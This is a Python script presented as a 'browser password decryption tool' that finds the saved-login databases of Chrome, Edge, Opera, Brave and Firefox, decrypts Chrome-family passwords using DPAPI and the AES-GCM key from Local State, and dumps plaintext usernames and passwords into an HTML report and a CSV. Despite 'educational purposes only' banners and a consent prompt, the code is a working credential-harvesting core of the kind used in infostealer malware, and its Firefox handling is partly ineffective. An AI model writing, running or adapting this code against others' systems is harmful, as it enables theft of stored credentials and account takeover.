import os
import sys
import json
import sqlite3
import base64
import shutil
import tempfile
import platform
from datetime import datetime
import subprocess
import getpass
import ctypes
from pathlib import Path
import struct
import win32api

# Try to import required crypto libraries
CRYPTO_AVAILABLE = False
DPAPI_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    import win32crypt
    from win32crypt import CryptUnprotectData

    CRYPTO_AVAILABLE = True
    DPAPI_AVAILABLE = True
except ImportError:
    print("[!] Some crypto libraries not available. Installing...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "pywin32"])
        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2
        import win32crypt
        from win32crypt import CryptUnprotectData

        CRYPTO_AVAILABLE = True
        DPAPI_AVAILABLE = True
    except:
        print("[!] Could not install required libraries. Some decryption may fail.")
        CRYPTO_AVAILABLE = False
        DPAPI_AVAILABLE = False

# Native Windows DPAPI functions
try:
    import ctypes.wintypes

    dllcrypt = ctypes.windll.crypt32
    CRYPT_VERIFYCONTEXT = 0xF0000000
    CRYPT_NEWKEYSET = 0x00000008
    PROV_RSA_FULL = 1
    DPAPI_NATIVE_AVAILABLE = True
except:
    DPAPI_NATIVE_AVAILABLE = False


def decrypt_chrome_password_win(encrypted_password):
    """Decrypt Chrome password using Windows DPAPI"""
    if not encrypted_password or len(encrypted_password) == 0:
        return ""

    try:
        # First try with win32crypt (most reliable)
        if DPAPI_AVAILABLE:
            decrypted_data = win32crypt.CryptUnprotectData(
                encrypted_password,
                None,
                None,
                None,
                0
            )
            return decrypted_data[1].decode('utf-8', errors='ignore')
    except:
        pass

    # Fallback: Try manual decryption for Chrome v80+
    try:
        # Chrome v80+ uses AES-256-GCM with key derived from DPAPI
        if len(encrypted_password) > 15:
            # Extract the encrypted data (skip DPAPI prefix if present)
            if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                # This is Chrome v80+ encrypted data
                # We need the encryption key from Local State
                return decrypt_chrome_v80_plus(encrypted_password)
    except:
        pass

    return "[Decryption Failed - Try running as same user]"


def get_chrome_encryption_key():
    """Get Chrome v80+ encryption key from Local State"""
    try:
        if platform.system() == "Windows":
            local_state_path = os.path.join(
                os.environ['LOCALAPPDATA'],
                'Google',
                'Chrome',
                'User Data',
                'Local State'
            )
        elif platform.system() == "Darwin":
            local_state_path = os.path.join(
                os.path.expanduser('~'),
                'Library',
                'Application Support',
                'Google',
                'Chrome',
                'Local State'
            )
        else:
            local_state_path = os.path.join(
                os.path.expanduser('~'),
                '.config',
                'google-chrome',
                'Local State'
            )

        if os.path.exists(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)

            # Get encrypted key
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])

            # Remove DPAPI prefix
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix

            # Decrypt using DPAPI
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

            return decrypted_key
    except Exception as e:
        print(f"[!] Failed to get Chrome encryption key: {e}")

    return None


def decrypt_chrome_v80_plus(encrypted_data):
    """Decrypt Chrome v80+ passwords using AES-GCM"""
    try:
        # Get encryption key
        key = get_chrome_encryption_key()
        if not key:
            return "[Encrypted - Chrome v80+]"

        # Extract nonce and ciphertext
        nonce = encrypted_data[3:15]  # 12-byte nonce
        ciphertext = encrypted_data[15:-16]  # Ciphertext without tag
        tag = encrypted_data[-16:]  # 16-byte tag

        # Create AES-GCM cipher
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)

        # Decrypt
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8', errors='ignore')

    except Exception as e:
        return f"[Decryption Failed: {str(e)[:50]}]"


def decrypt_firefox_password(encrypted_data, profile_path):
    """Attempt Firefox password decryption"""
    try:
        # Firefox uses NSS (Network Security Services)
        # This is complex and requires the Firefox profile's key database

        # First, check if master password is set
        key_db = os.path.join(profile_path, 'key4.db')
        if not os.path.exists(key_db):
            return "[Firefox - No key database found]"

        # Try using firefox_decrypt tool approach
        return attempt_firefox_decryption(encrypted_data, profile_path)

    except Exception as e:
        return f"[Firefox Decryption Failed: {e}]"


def attempt_firefox_decryption(encrypted_data, profile_path):
    """Try to decrypt Firefox passwords"""
    # This is a simplified approach - real decryption requires NSS library

    # Check for firefox_decrypt Python script
    try:
        # Try to use external firefox_decrypt if available
        import firefox_decrypt
        return "[Firefox - Use firefox_decrypt tool]"
    except ImportError:
        pass

    # Try to find logins.json and decrypt using simple method
    logins_file = os.path.join(profile_path, 'logins.json')
    if os.path.exists(logins_file):
        with open(logins_file, 'r', encoding='utf-8') as f:
            data = json.load(f)

        # Check if passwords are visible (if no master password)
        for login in data.get('logins', []):
            if 'encryptedPassword' in login:
                # Try base64 decode
                try:
                    decoded = base64.b64decode(login['encryptedPassword'])
                    if decoded.startswith(b'~'):
                        return "[Firefox - Has Master Password]"
                    else:
                        # Might be plain text or simple encoding
                        return decoded.decode('utf-8', errors='ignore')
                except:
                    return "[Firefox - Encrypted with Master Password]"

    return "[Firefox - Manual decryption required]"


def extract_browser_passwords_full():
    """Extract and decrypt passwords from all browsers"""
    print("\n" + "=" * 80)
    print("🔐 BROWSER PASSWORD DECRYPTION TOOL")
    print("=" * 80)
    print("⚠️  For educational purposes only. Use on your own systems.")
    print("=" * 80)

    all_decrypted_passwords = []

    # Check if running with proper permissions
    if platform.system() == "Windows":
        try:
            import win32security
            import win32con
            token = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32con.TOKEN_QUERY
            )
            print("[✓] Running with appropriate permissions")
        except:
            print("[!] May need to run as administrator for full decryption")

    # 1. Chrome Passwords
    print("\n[1] DECRYPTING CHROME PASSWORDS...")
    chrome_passwords = extract_chrome_passwords_decrypted()
    all_decrypted_passwords.extend(chrome_passwords)
    print(f"   Decrypted: {len([p for p in chrome_passwords if '[' not in p['password']])}/{len(chrome_passwords)}")

    # 2. Edge Passwords
    print("\n[2] DECRYPTING EDGE PASSWORDS...")
    edge_passwords = extract_edge_passwords_decrypted()
    all_decrypted_passwords.extend(edge_passwords)
    print(f"   Decrypted: {len([p for p in edge_passwords if '[' not in p['password']])}/{len(edge_passwords)}")

    # 3. Firefox Passwords
    print("\n[3] ATTEMPTING FIREFOX PASSWORD DECRYPTION...")
    firefox_passwords = extract_firefox_passwords_decrypted()
    all_decrypted_passwords.extend(firefox_passwords)

    # 4. Other browsers
    print("\n[4] CHECKING OTHER BROWSERS...")
    opera_passwords = extract_opera_passwords_decrypted()
    brave_passwords = extract_brave_passwords_decrypted()
    all_decrypted_passwords.extend(opera_passwords)
    all_decrypted_passwords.extend(brave_passwords)

    # Generate comprehensive report
    generate_decrypted_report(all_decrypted_passwords)

    return all_decrypted_passwords


def extract_chrome_passwords_decrypted():
    """Extract Chrome passwords with decryption attempts"""
    passwords = []

    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data')
    elif platform.system() == "Darwin":
        base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Google', 'Chrome')
    else:
        base_path = os.path.join(os.path.expanduser('~'), '.config', 'google-chrome')

    # Find all profiles
    profiles = ['Default']
    if os.path.exists(base_path):
        for item in os.listdir(base_path):
            if item.startswith('Profile'):
                profiles.append(item)

    for profile in profiles:
        login_data = os.path.join(base_path, profile, 'Login Data')
        if os.path.exists(login_data):
            try:
                # Copy database to temp location
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                temp_db.close()
                shutil.copy2(login_data, temp_db.name)

                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()

                # Get all login data
                cursor.execute("""
                               SELECT origin_url, username_value, password_value, date_created, date_last_used
                               FROM logins
                               WHERE username_value != ''
                               ORDER BY date_last_used DESC
                               """)

                for url, username, enc_password, created, last_used in cursor.fetchall():
                    password = ""

                    if enc_password:
                        if platform.system() == "Windows":
                            password = decrypt_chrome_password_win(enc_password)
                        else:
                            # macOS/Linux - Chrome uses OS keychain
                            password = decrypt_chrome_mac_linux(enc_password, profile)

                    passwords.append({
                        'browser': 'Chrome',
                        'profile': profile,
                        'url': url,
                        'username': username,
                        'password': password if password else "[Empty or Failed]",
                        'date': datetime.fromtimestamp(
                            last_used / 1000000 - 11644473600
                        ).strftime('%Y-%m-%d %H:%M:%S') if last_used else 'N/A',
                        'status': '✅' if password and '[' not in password else '❌'
                    })

                conn.close()
                os.unlink(temp_db.name)

            except Exception as e:
                print(f"[!] Chrome ({profile}) error: {e}")
                continue

    return passwords


def decrypt_chrome_mac_linux(encrypted_data, profile):
    """Decrypt Chrome passwords on macOS/Linux"""
    try:
        # On macOS, Chrome uses Keychain
        # On Linux, Chrome uses libsecret/gnome-keyring

        if platform.system() == "Darwin":
            # Try to use security command
            import subprocess
            # This is simplified - real decryption requires Keychain access
            return "[macOS Keychain - Run Chrome while logged in]"
        else:
            # Linux - try to use secret-tool
            return "[Linux - Requires gnome-keyring unlocked]"

    except:
        return "[Platform-specific decryption required]"


def extract_edge_passwords_decrypted():
    """Extract Edge passwords with decryption"""
    passwords = []

    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data')
    else:
        return passwords  # Edge is Windows-only

    profiles = ['Default']
    if os.path.exists(base_path):
        for item in os.listdir(base_path):
            if item.startswith('Profile'):
                profiles.append(item)

    for profile in profiles:
        login_data = os.path.join(base_path, profile, 'Login Data')
        if os.path.exists(login_data):
            try:
                temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
                temp_db.close()
                shutil.copy2(login_data, temp_db.name)

                conn = sqlite3.connect(temp_db.name)
                cursor = conn.cursor()

                cursor.execute("""
                               SELECT origin_url, username_value, password_value, date_created, date_last_used
                               FROM logins
                               WHERE username_value != ''
                               ORDER BY date_last_used DESC
                               """)

                for url, username, enc_password, created, last_used in cursor.fetchall():
                    password = ""

                    if enc_password:
                        # Edge uses same encryption as Chrome
                        password = decrypt_chrome_password_win(enc_password)

                    passwords.append({
                        'browser': 'Edge',
                        'profile': profile,
                        'url': url,
                        'username': username,
                        'password': password if password else "[Empty or Failed]",
                        'date': datetime.fromtimestamp(
                            last_used / 1000000 - 11644473600
                        ).strftime('%Y-%m-%d %H:%M:%S') if last_used else 'N/A',
                        'status': '✅' if password and '[' not in password else '❌'
                    })

                conn.close()
                os.unlink(temp_db.name)

            except Exception as e:
                print(f"[!] Edge ({profile}) error: {e}")
                continue

    return passwords


def extract_firefox_passwords_decrypted():
    """Extract Firefox passwords with decryption attempts"""
    passwords = []

    if platform.system() == "Windows":
        profiles_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
    elif platform.system() == "Darwin":
        profiles_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox', 'Profiles')
    else:
        profiles_path = os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox')

    if not os.path.exists(profiles_path):
        return passwords

    # Find profiles
    for profile_dir in os.listdir(profiles_path):
        profile_path = os.path.join(profiles_path, profile_dir)
        if os.path.isdir(profile_path):
            logins_file = os.path.join(profile_path, 'logins.json')
            key_db = os.path.join(profile_path, 'key4.db')

            if os.path.exists(logins_file) and os.path.exists(key_db):
                try:
                    with open(logins_file, 'r', encoding='utf-8') as f:
                        logins_data = json.load(f)

                    for login in logins_data.get('logins', []):
                        url = login.get('hostname', '')
                        username = login.get('username', '')
                        enc_password = login.get('encryptedPassword', '')
                        created = login.get('timeCreated', 0)
                        last_used = login.get('timeLastUsed', 0)

                        # Attempt decryption
                        password = decrypt_firefox_password_base64(enc_password, profile_path)

                        passwords.append({
                            'browser': 'Firefox',
                            'profile': profile_dir,
                            'url': url,
                            'username': username,
                            'password': password,
                            'date': datetime.fromtimestamp(
                                last_used / 1000
                            ).strftime('%Y-%m-%d %H:%M:%S') if last_used else 'N/A',
                            'status': '✅' if password and '[' not in password else '❌'
                        })

                except Exception as e:
                    print(f"[!] Firefox ({profile_dir}) error: {e}")
                    continue

    return passwords


def decrypt_firefox_password_base64(encrypted_password, profile_path):
    """Simple Firefox password decryption attempt"""
    if not encrypted_password:
        return ""

    try:
        # Decode base64
        decoded = base64.b64decode(encrypted_password)

        # Check if it's ASN.1 encoded or simple
        if decoded.startswith(b'~'):
            return "[Firefox - Master Password Protected]"

        # Try UTF-8 decode
        try:
            return decoded.decode('utf-8')
        except:
            # Try other encodings
            for encoding in ['latin-1', 'cp1252', 'ascii']:
                try:
                    return decoded.decode(encoding)
                except:
                    continue

            # Try to find the real decryption
            return attempt_firefox_real_decryption(decoded, profile_path)

    except Exception as e:
        return f"[Decode Failed: {str(e)[:30]}]"


def attempt_firefox_real_decryption(encrypted_data, profile_path):
    """Try more advanced Firefox decryption"""
    # This would require NSS library integration
    # For now, provide instructions

    instructions = """
    To decrypt Firefox passwords:
    1. Install firefox-decrypt: pip install firefox-decrypt
    2. Run: firefox-decrypt
    3. Or use: python -m firefox_decrypt
    """

    return "[Use firefox-decrypt tool]"


def extract_opera_passwords_decrypted():
    """Extract Opera passwords"""
    passwords = []

    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable')
    elif platform.system() == "Darwin":
        base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'com.operasoftware.Opera')
    else:
        base_path = os.path.join(os.path.expanduser('~'), '.config', 'opera')

    login_data = os.path.join(base_path, 'Login Data')

    if os.path.exists(login_data):
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            temp_db.close()
            shutil.copy2(login_data, temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            cursor.execute("""
                           SELECT origin_url, username_value, password_value, date_created, date_last_used
                           FROM logins
                           WHERE username_value != ''
                           ORDER BY date_last_used DESC
                           """)

            for url, username, enc_password, created, last_used in cursor.fetchall():
                password = ""

                if enc_password and platform.system() == "Windows":
                    password = decrypt_chrome_password_win(enc_password)

                passwords.append({
                    'browser': 'Opera',
                    'profile': 'Default',
                    'url': url,
                    'username': username,
                    'password': password if password else "[Check Chrome method]",
                    'date': datetime.fromtimestamp(
                        last_used / 1000000 - 11644473600
                    ).strftime('%Y-%m-%d %H:%M:%S') if last_used else 'N/A',
                    'status': '✅' if password and '[' not in password else '❌'
                })

            conn.close()
            os.unlink(temp_db.name)

        except Exception as e:
            print(f"[!] Opera error: {e}")

    return passwords


def extract_brave_passwords_decrypted():
    """Extract Brave browser passwords"""
    passwords = []

    if platform.system() == "Windows":
        base_path = os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data')
    elif platform.system() == "Darwin":
        base_path = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'BraveSoftware',
                                 'Brave-Browser')
    else:
        base_path = os.path.join(os.path.expanduser('~'), '.config', 'brave-browser')

    login_data = os.path.join(base_path, 'Default', 'Login Data')

    if os.path.exists(login_data):
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            temp_db.close()
            shutil.copy2(login_data, temp_db.name)

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            cursor.execute("""
                           SELECT origin_url, username_value, password_value, date_created, date_last_used
                           FROM logins
                           WHERE username_value != ''
                           ORDER BY date_last_used DESC
                           """)

            for url, username, enc_password, created, last_used in cursor.fetchall():
                password = ""

                if enc_password and platform.system() == "Windows":
                    password = decrypt_chrome_password_win(enc_password)

                passwords.append({
                    'browser': 'Brave',
                    'profile': 'Default',
                    'url': url,
                    'username': username,
                    'password': password if password else "[Check Chrome method]",
                    'date': datetime.fromtimestamp(
                        last_used / 1000000 - 11644473600
                    ).strftime('%Y-%m-%d %H:%M:%S') if last_used else 'N/A',
                    'status': '✅' if password and '[' not in password else '❌'
                })

            conn.close()
            os.unlink(temp_db.name)

        except Exception as e:
            print(f"[!] Brave error: {e}")

    return passwords


def generate_decrypted_report(passwords):
    """Generate HTML report with decrypted passwords"""
    downloads = os.path.join(os.path.expanduser('~'), 'Downloads')
    report_path = os.path.join(downloads, f'Decrypted_Passwords_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html')

    # Count statistics
    total = len(passwords)
    decrypted = len([p for p in passwords if p['status'] == '✅'])
    failed = len([p for p in passwords if p['status'] == '❌'])

    # Group by browser
    browsers = {}
    for pwd in passwords:
        browser = pwd['browser']
        if browser not in browsers:
            browsers[browser] = {'total': 0, 'decrypted': 0}
        browsers[browser]['total'] += 1
        if pwd['status'] == '✅':
            browsers[browser]['decrypted'] += 1

    # Generate HTML
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Decrypted Browser Passwords Report</title>
        <style>
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #0d1117;
                color: #c9d1d9;
                margin: 0;
                padding: 20px;
                line-height: 1.6;
            }}
            .container {{
                max-width: 1400px;
                margin: 0 auto;
                background: #161b22;
                border-radius: 10px;
                padding: 30px;
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
                border: 1px solid #30363d;
            }}
            .header {{
                text-align: center;
                margin-bottom: 30px;
                padding-bottom: 20px;
                border-bottom: 2px solid #238636;
            }}
            .header h1 {{
                color: #58a6ff;
                font-size: 28px;
                margin: 0;
            }}
            .header p {{
                color: #8b949e;
                margin: 10px 0 0 0;
            }}
            .stats {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }}
            .stat-card {{
                background: #21262d;
                padding: 20px;
                border-radius: 8px;
                text-align: center;
                border: 1px solid #30363d;
                transition: transform 0.3s;
            }}
            .stat-card:hover {{
                transform: translateY(-5px);
                border-color: #238636;
            }}
            .stat-number {{
                font-size: 36px;
                font-weight: bold;
                margin: 10px 0;
            }}
            .stat-success {{ color: #3fb950; }}
            .stat-warning {{ color: #d29922; }}
            .stat-error {{ color: #f85149; }}
            .stat-info {{ color: #58a6ff; }}
            .browser-stats {{
                display: flex;
                flex-wrap: wrap;
                gap: 15px;
                margin: 20px 0;
                justify-content: center;
            }}
            .browser-badge {{
                background: #21262d;
                padding: 10px 20px;
                border-radius: 20px;
                border: 1px solid #30363d;
                display: flex;
                align-items: center;
                gap: 10px;
            }}
            .browser-icon {{
                font-size: 20px;
            }}
            .password-table {{
                width: 100%;
                border-collapse: collapse;
                margin-top: 20px;
            }}
            .password-table th {{
                background: #1f6feb;
                color: white;
                padding: 15px;
                text-align: left;
                position: sticky;
                top: 0;
            }}
            .password-table td {{
                padding: 12px 15px;
                border-bottom: 1px solid #30363d;
            }}
            .password-table tr:hover {{
                background: rgba(88, 166, 255, 0.1);
            }}
            .password-cell {{
                font-family: 'Consolas', monospace;
                background: rgba(46, 160, 67, 0.1);
                padding: 5px 10px;
                border-radius: 4px;
                border: 1px solid #238636;
                color: #3fb950;
                font-weight: bold;
            }}
            .failed-cell {{
                background: rgba(248, 81, 73, 0.1);
                border-color: #f85149;
                color: #f85149;
            }}
            .status-success {{
                color: #3fb950;
                font-weight: bold;
            }}
            .status-failed {{
                color: #f85149;
                font-weight: bold;
            }}
            .url-cell {{
                max-width: 250px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }}
            .section {{
                margin: 40px 0;
            }}
            .section h2 {{
                color: #58a6ff;
                border-bottom: 1px solid #30363d;
                padding-bottom: 10px;
                margin-bottom: 20px;
            }}
            .instructions {{
                background: rgba(88, 166, 255, 0.1);
                border-left: 4px solid #58a6ff;
                padding: 20px;
                margin: 30px 0;
                border-radius: 0 8px 8px 0;
            }}
            .warning {{
                background: rgba(248, 81, 73, 0.1);
                border: 1px solid #f85149;
                padding: 20px;
                border-radius: 8px;
                margin: 30px 0;
            }}
            .footer {{
                text-align: center;
                margin-top: 40px;
                padding-top: 20px;
                border-top: 1px solid #30363d;
                color: #8b949e;
                font-size: 14px;
            }}
            @media (max-width: 768px) {{
                .container {{ padding: 15px; }}
                .password-table {{ font-size: 14px; }}
                .password-table th, .password-table td {{ padding: 8px 10px; }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔓 DECRYPTED BROWSER PASSWORDS REPORT</h1>
                <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | User: {getpass.getuser()}</p>
            </div>

            <div class="warning">
                <h3>⚠️ SECURITY WARNING</h3>
                <p>This report contains sensitive password information. Please:</p>
                <ul>
                    <li>Store this file securely (encrypt if possible)</li>
                    <li>Delete when no longer needed</li>
                    <li>Do not share with unauthorized persons</li>
                    <li>Change passwords if security is compromised</li>
                </ul>
            </div>

            <div class="stats">
                <div class="stat-card">
                    <div>Total Passwords Found</div>
                    <div class="stat-number stat-info">{total}</div>
                </div>
                <div class="stat-card">
                    <div>Successfully Decrypted</div>
                    <div class="stat-number stat-success">{decrypted}</div>
                </div>
                <div class="stat-card">
                    <div>Failed to Decrypt</div>
                    <div class="stat-number stat-error">{failed}</div>
                </div>
                <div class="stat-card">
                    <div>Success Rate</div>
                    <div class="stat-number stat-warning">{round((decrypted / total * 100) if total > 0 else 0, 1)}%</div>
                </div>
            </div>

            <div class="section">
                <h2>📊 Browser Statistics</h2>
                <div class="browser-stats">
    '''

    # Browser badges
    for browser, stats in browsers.items():
        rate = round((stats['decrypted'] / stats['total'] * 100) if stats['total'] > 0 else 0, 1)
        html += f'''
                    <div class="browser-badge">
                        <span class="browser-icon">🌐</span>
                        <div>
                            <strong>{browser}</strong><br>
                            {stats['decrypted']}/{stats['total']} ({rate}%)
                        </div>
                    </div>
        '''

    html += '''
                </div>
            </div>

            <div class="section">
                <h2>🔑 Decrypted Passwords</h2>
                <table class="password-table">
                    <thead>
                        <tr>
                            <th>Browser</th>
                            <th>Profile</th>
                            <th>Website URL</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Last Used</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
    '''

    # Password rows
    for pwd in passwords:
        password_class = "password-cell" if pwd['status'] == '✅' else "password-cell failed-cell"
        status_class = "status-success" if pwd['status'] == '✅' else "status-failed"

        html += f'''
                        <tr>
                            <td>{pwd['browser']}</td>
                            <td>{pwd['profile']}</td>
                            <td class="url-cell" title="{pwd['url']}">{pwd['url'][:40]}{'...' if len(pwd['url']) > 40 else ''}</td>
                            <td>{pwd['username']}</td>
                            <td><span class="{password_class}">{pwd['password']}</span></td>
                            <td>{pwd['date']}</td>
                            <td class="{status_class}">{pwd['status']}</td>
                        </tr>
        '''

    html += '''
                    </tbody>
                </table>
            </div>

            <div class="instructions">
                <h3>💡 Decryption Tips</h3>
                <p><strong>For Chrome/Edge/Brave/Opera on Windows:</strong></p>
                <ul>
                    <li>Must be run as the same Windows user who saved the passwords</li>
                    <li>User must be logged in (not locked screen)</li>
                    <li>Chrome v80+ requires specific decryption methods</li>
                </ul>
                <p><strong>For Firefox:</strong></p>
                <ul>
                    <li>Install firefox-decrypt tool: <code>pip install firefox-decrypt</code></li>
                    <li>Run: <code>firefox-decrypt</code> or <code>python -m firefox_decrypt</code></li>
                    <li>If master password is set, you'll need to enter it</li>
                </ul>
                <p><strong>For macOS/Linux:</strong></p>
                <ul>
                    <li>Chrome uses OS keychain/gnome-keyring which must be unlocked</li>
                    <li>Run Chrome while user is logged in for best results</li>
                </ul>
            </div>

            <div class="footer">
                <p>Generated by Browser Password Decryptor Tool | For educational and authorized security testing only</p>
                <p>Report saved to: <code>{report_path}</code></p>
                <p>⚠️ Handle this information with extreme caution ⚠️</p>
            </div>
        </div>
    </body>
    </html>
    '''

    # Write HTML file
    with open(report_path, 'w', encoding='utf-8') as f:
        f.write(html)

    print(f"\n[+] Report generated: {report_path}")
    print(
        f"[+] Statistics: {decrypted}/{total} passwords decrypted ({round((decrypted / total * 100) if total > 0 else 0, 1)}%)")

    # Show some decrypted passwords in console
    print("\n[+] Sample decrypted passwords:")
    decrypted_samples = [p for p in passwords if p['status'] == '✅']
    for i, pwd in enumerate(decrypted_samples[:5]):
        print(f"\n  {i + 1}. {pwd['browser']} - {pwd['url'][:40]}")
        print(f"     Username: {pwd['username']}")
        print(f"     Password: {pwd['password']}")

    # Try to open report
    try:
        if platform.system() == "Windows":
            os.startfile(report_path)
        elif platform.system() == "Darwin":
            subprocess.run(["open", report_path])
        else:
            subprocess.run(["xdg-open", report_path])
    except:
        pass

    return report_path


def save_decrypted_csv(passwords, filename="decrypted_passwords.csv"):
    """Save decrypted passwords to CSV"""
    import csv

    with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
        fieldnames = ['browser', 'profile', 'url', 'username', 'password', 'date', 'status']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for pwd in passwords:
            writer.writerow(pwd)

    print(f"[+] CSV saved: {filename}")
    return filename


# Main function
if __name__ == "__main__":
    import sys

    print("\n" + "=" * 80)
    print("🔓 BROWSER PASSWORD DECRYPTION TOOL")
    print("=" * 80)
    print("⚠️  WARNING: For educational purposes only")
    print("⚠️  Only use on systems you own or have explicit permission to test")
    print("=" * 80)

    # Check requirements
    if not CRYPTO_AVAILABLE:
        print("\n[!] Installing required packages...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome", "pywin32", "pypiwin32"])
            print("[✓] Packages installed successfully")
        except:
            print("[!] Could not install packages automatically")
            print("[!] Please run: pip install pycryptodome pywin32")

    # Confirmation
    response = input("\nDo you understand and accept responsibility? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("Aborted.")
        sys.exit(0)

    try:
        # Extract and decrypt
        print("\n" + "=" * 80)
        print("Starting decryption process...")
        print("=" * 80)

        decrypted_passwords = extract_browser_passwords_full()

        if decrypted_passwords:
            # Save to CSV
            csv_file = save_decrypted_csv(decrypted_passwords)

            print("\n" + "=" * 80)
            print("DECRYPTION COMPLETE")
            print("=" * 80)
            print(f"HTML Report: Generated in Downloads folder")
            print(f"CSV File: {csv_file}")
            print("=" * 80)
            print("\n⚠️  Remember: Store these files securely and delete when done!")
        else:
            print("\n[!] No passwords found or decryption failed completely.")

    except Exception as e:
        print(f"\n[!] Critical error: {e}")
        import traceback

        traceback.print_exc()
        print("\n[!] Try running as administrator/sudo if on Windows/macOS/Linux")